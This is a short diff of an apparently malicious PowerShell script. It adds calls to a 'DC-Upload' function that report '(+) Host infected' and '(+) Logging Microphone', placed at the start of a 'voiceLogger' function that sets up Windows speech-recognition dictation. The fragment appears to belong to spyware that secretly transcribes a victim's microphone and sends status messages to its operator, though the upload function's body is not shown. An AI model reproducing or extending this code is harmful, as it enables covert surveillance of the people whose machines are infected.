@@ -20,6 +20,8 @@ function DC-Upload {
 
 function voiceLogger {
 
+    DC-Upload '(+) Host infected' 
+    DC-Upload '(+) Logging Microphone' 
     Add-Type -AssemblyName System.Speech
     $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
     $grammar = New-Object System.Speech.Recognition.DictationGrammar
